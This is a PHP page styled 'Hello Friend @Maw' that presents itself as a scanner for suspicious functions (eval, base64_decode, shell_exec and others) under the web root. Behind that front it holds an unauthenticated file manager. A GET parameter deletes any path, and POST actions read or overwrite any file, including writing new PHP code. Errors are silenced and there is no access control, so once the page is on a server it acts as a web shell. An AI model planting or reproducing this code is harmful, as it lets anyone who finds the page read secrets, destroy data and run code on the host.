<?php
error_reporting(0);
ini_set('display_errors', 0);

$scan_dir = $_SERVER['DOCUMENT_ROOT'];

$find = array(
    'default',
    'base64_decode', 'base64_encode', 'gzuncompress', 'gzdecode', 'gzinflate',  
    'passthru', 'popen', 'proc_open', 'shell_exec', 'exec',  
    'eval', 'assert', 'call_user_func', 'call_user_func_array', 'create_function',  
    'curl_exec', 'curl_multi_exec', 'stream_context_create',  
    'preg_replace', 'preg_replace_callback',  
    'posix_getpwuid', 'posix_getgrgid'
);

function scan_directory($dir, $signatures) {
    $results = [];
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    foreach ($files as $file) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
            $content = file_get_contents($file);
            foreach ($signatures as $sig) {
                if (stripos($content, $sig) !== false) {
                    $results[] = [
                        'path' => $file->getPathname(),
                        'permissions' => substr(sprintf('%o', fileperms($file)), -4),
                        'last_modified' => date("Y-m-d H:i:s", filemtime($file))
                    ];
                    break;
                }
            }
        }
    }
    return $results;
}

if (isset($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    if (file_exists($file_to_delete)) {
        unlink($file_to_delete);
        echo "<script>alert('Deleted!'); window.location.href='?';</script>";
    }
}

if (isset($_POST['file']) && isset($_POST['action'])) {
    $file = $_POST['file'];
    if ($_POST['action'] === 'load' && file_exists($file)) {
        echo htmlspecialchars(file_get_contents($file));
        exit;
    } elseif ($_POST['action'] === 'save' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "Saved!!";
        exit;
    }
}

$suspected_files = scan_directory($scan_dir, $find);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { 
		font-family: Arial, sans-serif; margin: 20px; 
		background: url('https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/hello-friends.webp') no-repeat center center fixed;
        background-size: cover;
		}
            table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 15px;
        border-radius: 8px;
        overflow: hidden;
        background: rgba(40, 40, 40, 0.95);
        box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
    }

    th, td {
        padding: 12px;
        border: 1px solid #444;
        text-align: left;
        color: white;
        font-size: 0.9em;
    }

    th {
        color: #fff;
        font-weight: bold;
        text-transform: uppercase;
    }

    tr:nth-child(even) {
        background: rgba(255, 255, 255, 0.05);
    }

    tr:hover {
        background: rgba(255, 255, 255, 0.15);
        transition: 0.3s;
    }

    td {
        border-left: none;
        border-right: none;
    }
		h1, h3, h2 { color: white;}
        .danger { color: red; }
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.4);
        }
        .modal-content {
            background-color: #f200001c;
            margin: 10% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
        }
        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }
        .close:hover, .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }
		    .btn {
        display: inline-block;
        padding: 6px 12px;
        text-decoration: none;
        color: white;
        font-size: 0.9em;
        border-radius: 4px;
        border: 2px solid;
        transition: 0.3s;
    }

    .delete-btn {
        border-color: red;
        color: red;
        background: transparent;
    }

    .delete-btn:hover {
        background: red;
        color: white;
    }

    .edit-btn {
        border-color: limegreen;
        color: limegreen;
        background: transparent;
    }

    .edit-btn:hover {
        background: limegreen;
        color: white;
    }
    </style>
</head>
<body>
    <h2>Hello Friend @Maw</h2>
    <button onclick="window.location.reload();" class="btn delete-btn">Scan</button>
    <h3>Result:</h3>
    
    <?php if (!empty($suspected_files)) : ?>
        <table>
            <tr>
                <th>File</th>
                <th>Permissions</th>
                <th>Last Modified</th>
                <th>Action</th>
            </tr>
            <?php foreach ($suspected_files as $file) : ?>
                <tr>
                    <td class="danger"><?php echo htmlspecialchars($file['path']); ?></td>
                    <td><?php echo htmlspecialchars($file['permissions']); ?></td>
                    <td><?php echo htmlspecialchars($file['last_modified']); ?></td>
<td>
    <a href="?delete=<?php echo urlencode($file['path']); ?>" 
       onclick="return confirm('Are You Sure?');" 
       class="btn delete-btn">Delete</a>
    
    <a href="#" class="btn edit-btn" data-file="<?php echo htmlspecialchars($file['path']); ?>">Edit</a>
</td>

                </tr>
            <?php endforeach; ?>
        </table>
    <?php else : ?>
        <p>Nothing Here.</p>
    <?php endif; ?>

    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h3>Edit File</h3>
            <textarea id="fileContent" style="width: 100%; height: 300px;"></textarea>
            <button id="saveFile">Save</button>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            let currentFile = '';
            $('.edit-btn').click(function(e) {
                e.preventDefault();
                currentFile = $(this).data('file');
                $.post('', { file: currentFile, action: 'load' }, function(response) {
                    $('#fileContent').val(response);
                    $('#editModal').fadeIn();
                });
            });
            $('.close').click(function() {
                $('#editModal').fadeOut();
            });
            $('#saveFile').click(function() {
                $.post('', {
                    file: currentFile,
                    action: 'save',
                    content: $('#fileContent').val()
                }, function() {
                    alert('Saved!!');
                    $('#editModal').fadeOut();
                });
            });
        });
    </script>
</body>
</html>
